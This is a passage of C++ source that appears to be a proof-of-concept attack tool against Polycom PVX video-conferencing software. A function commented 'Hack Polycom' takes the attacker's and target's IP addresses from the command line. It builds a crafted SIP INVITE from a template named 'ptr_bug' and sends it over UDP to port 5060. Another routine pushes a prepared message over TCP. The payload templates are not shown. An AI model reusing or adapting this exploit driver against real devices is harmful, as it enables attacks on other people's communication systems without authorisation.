	const unsigned long ip = 0xC0A82946;	// "192.168.41.70"

	unsigned long mills = 20000;

	

	if ( !TCP.Connect(ip, 5060, mills) )
	{
		printf("[-] Connect()\n");
		return 0;
	}else{
		printf("[+] Connect()\n");
	}
	
	//if ( !TCP.Accept("192.168.61.175", 5060, mills, false) )
	//{
	//	printf("[-] Accept()\n");
	//	return 0;
	//}else{
	//	printf("[+] Accept()\n");
	//}


	//printf("Recive Inivite...");
	//char buff[65536];
	//int in_bytes = TCP.Receive(buff, 65536, mills);
	//buff[in_bytes] = 0;
	//printf("[OK]\n");

	int out_bytes = 0;
	out_bytes = TCP.Send((void*) msg1_TCP, msg1_TCP_sz, mills);
	if (out_bytes  < 1)
	{
		TCP.Disconnect();
		printf("[-] TCP.Send()\n");
		return 0;
	}else{
		printf("[+] TCP.Send()\n");
	}

	//char buff[65536];
	//printf("Recive ACK...");
	//memset(buff, 0, 65536);
	//in_bytes = TCP.Receive(buff, 65536, mills);
	//buff[in_bytes] = 0;
	//printf("[OK]\n");
	//printf("---[ buff:" << in_bytes << " ]---------------\n" << buff << "-------------------------\n");


return 0;
}

#include <iostream>

class VS_TerminalAbstractFactory * __cdecl VS_RetriveMultiGatewayTranscoder(void)
{
	return 0;
}

// Hack Polycom
int main5(int argc, char *argv[])
{
	if (argc < 3)
	{
		printf("Usage: pvx.exe my_ip pvx_ip\nExample: pvx.exe 192.168.0.2 192.168.0.66\n\n");
		return -1;
	}

	// My Host
	const char* host = argv[1];
	if (!host || !*host)
		return -2;
	unsigned long host_ip=inet_addr(host);
	if (host_ip==INADDR_NONE)
		return -2;

	// My IP
	const char* dst_host = argv[2];
	if (!dst_host || !*dst_host)
		return -2;
	unsigned long dst_ip=ntohl(inet_addr(dst_host));
	if (dst_ip==INADDR_NONE)
		return -2;

	VS_ConnectionUDP UDP;

	if ( !VS_AcsLibInitial() )
	{
		std::cout << "[-] Init WinSock failed\n";
		return -1;
	}

	//const unsigned long host_sz = 256;
	//char host[host_sz];
	//if (!VS_GetDefaultHostName(host , 256))
	//{
	//	std::cout << "[-] can't get hostname\n";
	//	return -2;
	//}

	unsigned short binded_port(0);
	if ( !UDP.BindInRange(host, 3000, 30000, &binded_port) )
	{
		std::cout << "[-] can't bind local port\n";
		return 0;
	}else{
		std::cout << "[+] bind ok: local_port = " << binded_port << "\n";
	}

	//const unsigned long ip = 0xD43523DB;	// "sipnet.ru"
//	const unsigned long ip = 0xC0A83E4D;	// "192.168.62.77"

	char tmp_buff[4096] = {0};
	sprintf(tmp_buff, ptr_bug, dst_host, host, binded_port, host, dst_host, host, binded_port, host, host, host, host);

	int out_bytes = UDP.SendTo((void*) tmp_buff, strlen(tmp_buff), dst_ip, 5060);
	if (out_bytes < 1)
	{
		std::cout << "[-] UDP sendto failed\n";
		return 0;
	}else{
		std::cout << "[+] INVITE sent. Close socket\n";
	}

	UDP.Close();

	return 0;
}

int main(int argc, char *argv[])
{
	return main5(argc, argv);
}